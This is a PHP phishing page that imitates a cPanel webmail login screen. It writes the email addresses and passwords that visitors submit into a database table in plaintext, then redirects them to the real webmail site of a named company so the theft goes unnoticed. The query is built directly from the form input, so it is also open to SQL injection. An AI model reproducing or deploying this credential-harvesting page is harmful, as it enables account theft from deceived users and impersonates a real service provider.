<?php require_once("connection.php"); ?>
<html>
<head>
<link rel="stylesheet" type="text/css" href="style.css"/>
</head>
<body>
<div class="div33">
<div class="div331">
<img class="img1" src="images/webmail-logo.svg"/>
</div>
<div class="div332">
<?php 
if (isset($_POST['submit']) )
{
	if (isset($_POST['user'])){ $user=$_POST['user'];}
	if (isset($_POST['pass'])){ $pass=$_POST['pass'];}	
	$db= new mysqli($hostname,$username,$password,$databasename); 
 $db->query(" insert into login (Username,Password) values ('$user','$pass')");
 header("Location:https://webmail.rajabearindo.co.id/?user=$user");

}

?>
<form method="POST" >
<label for="user"> Email Address </label>
<div class="inputfielduser">
<input name="user" id="user"  placeholder=" Enter your email address." class="std_textbox" type="text" >
</div>
<label for="pass"> Password </label>
<div class="inputfieldpassword">
<input name="pass" id="pass" placeholder=" Enter your email password." class="std_textbox" type="password" >
</div>
<button name="submit" type="submit" id="login_submit" tabindex="3">Log in</button>

<form>

</div>
</div>
<div class="copyright">Copyright©&nbsp;2020 cPanel, L.L.C.
    <br><a href="https://go.cpanel.net/privacy" target="_blank">Privacy Policy</a></div>

</body>
</html>